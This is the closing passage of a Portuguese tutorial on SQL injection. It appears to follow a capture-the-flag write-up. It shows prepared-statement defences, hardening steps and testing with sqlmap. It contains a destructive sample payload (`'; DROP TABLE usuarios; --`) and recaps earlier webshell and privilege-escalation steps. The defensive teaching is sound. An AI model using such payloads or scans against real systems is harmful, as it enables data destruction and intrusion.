$stmt->bind_param("i", $_GET['id']); 
// "i" indica que o parâmetro é um integer
// Outros tipos: "s" (string), "d" (double), "b" (blob)
// Isso adiciona uma camada extra de validação de tipo
$stmt->execute();
```

**Python com SQLite:**
```python
#  CORRETO
cursor.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
# A tupla (user_id,) é passada separadamente
# O driver do banco trata como dado, nunca como código
# A vírgula após user_id é obrigatória pra criar uma tupla de 1 elemento
```

**Node.js com MySQL:**
```javascript
//  CORRETO
connection.query(
  'SELECT * FROM usuarios WHERE id = ?',
  [req.params.id],  // Array com os valores
  function(error, results) { 
    // O driver substitui ? pelo valor de forma segura
    // Caracteres especiais são escapados automaticamente
  }
);
```

**Por que isso funciona?**

O ponto chave é: o dado do usuário é passado separadamente, como parâmetro. O banco de dados trata como dado puro, nunca como parte do comando SQL. Mesmo que o usuário digite `'; DROP TABLE usuarios; --`, isso será tratado literalmente como uma string de busca (vai procurar um usuário com esse nome bizarro), não como comando.

### Outras Camadas de Defesa

Prepared Statements são a principal defesa, mas segurança se faz em camadas:

**1. Validação de Input**
Valide se o dado faz sentido antes de usar. Se espera um número, verifique se é número:
```php
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($id === false) {
    die("ID inválido");
}
```

**2. Princípio do Menor Privilégio**
O usuário do banco que a aplicação usa não precisa ser root. Crie um usuário específico com apenas as permissões necessárias:
```sql
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'senha_forte';
GRANT SELECT, INSERT, UPDATE ON meu_banco.* TO 'app_user'@'localhost';
-- Note: sem DELETE, sem DROP, sem FILE
```

**3. Desabilitar Funções Perigosas**
No MySQL, a variável `secure_file_priv` limita onde `INTO OUTFILE` pode escrever. Configure para um diretório específico ou deixe vazio para desabilitar:
```ini
# my.cnf
secure_file_priv = ""
```

**4. WAF (Web Application Firewall)**
Ferramentas como ModSecurity podem bloquear requisições suspeitas. Não é solução definitiva (pode ser bypassado), mas adiciona uma camada.

**5. Não Exponha Erros em Produção**
Mensagens de erro detalhadas ajudam o atacante. Em produção:
```php
// php.ini
display_errors = Off
log_errors = On
```

**6. Escape de Output (Para XSS)**
Isso não previne SQLi diretamente, mas é boa prática. Sempre escape dados antes de exibir em HTML:
```php
echo htmlspecialchars($dado, ENT_QUOTES, 'UTF-8');
```

### Testando Sua Aplicação

Quer saber se sua aplicação é vulnerável? Teste você mesmo (em ambiente de desenvolvimento, claro):

1. **Teste manual:** Digite `'` nos campos e veja se dá erro
2. **SQLMap:** `sqlmap -u "http://localhost/busca?q=teste" --batch`
3. **Burp Suite Scanner:** Análise automatizada
4. **Code Review:** Procure por concatenação de strings em queries

---

## Conclusão

Percorremos um longo caminho. Começamos entendendo a teoria da "planilha do Excel" e o perigo da concatenação de strings. Passamos pelos diferentes tipos de SQLi (In-Band, Blind, Out-of-Band), aprendemos a mecânica do UNION e do INTO OUTFILE, e praticamos em laboratórios. Enfrentamos a frustração de uma senha Bcrypt inquebrável na Lion, o que nos forçou a pivotar criativamente para uma webshell. E, finalmente, usamos conhecimento base de Linux para identificar manualmente uma permissão de arquivo errada e virar administradores.

A lição que fica é clara: **ferramentas te ajudam, mas é o fundamento teórico que te salva** quando você precisa tomar decisões criativas. No que diz respeito a "desenvolvimento vibe-coding", se você tem o fundamento consegue pensar em prompts que forçam a IA a evitar determinadas ações que culminariam erros como SQLi, por exemplo. No que diz respeito ao processo de exploração, saber tomar decisões como abandonar o hash cracking ou procurar vetores manuais quando os scripts falham é o que separa o script kiddie do pentester de verdade.

SQL Injection existe desde os anos 90 e, infelizmente, continua relevante porque os mesmos erros continuam sendo cometidos, as vezes apenas de uma forma menos clara e tosca. A real diferença mesmo é que agora temos mais camadas de abstração (frameworks, ORMs, bibliotecas) que podem ajudar ou também podem dar falsa sensação de segurança. No fim das contas, entender o que acontece por baixo dos panos é o que faz a diferença e se você está lendo isso aqui, parabéns!

Enquanto houver desenvolvedores que ignoram a base, sempre haverá uma shell esperando por nós. Pratiquem, estudem a teoria e até a próxima invasão! A próxima máquina que resolveremos será outra com SQLi chamada GAP, também do hackingclub. Ela é um pouco mais difícil que a Lion e deixarei para outra publicação separada, mas é um excelente complemento... quase todos os requisitos para fazer a Lion também serve para ela, mas algumas coisas são diferentes, principalmente na elevação de pribilégio. Te vejo lá!

---

## Referências e Recursos

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [HackingClub](https://hackingclub.com/) - Plataforma com as máquinas práticas
- [SQLMap Documentation](https://sqlmap.org/)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

>Algum erro ou problema na postagem? Deixe um comentário abaixo através da sua conta do github. Elogios e reações também serão bem vindas, hehe. Abração!!
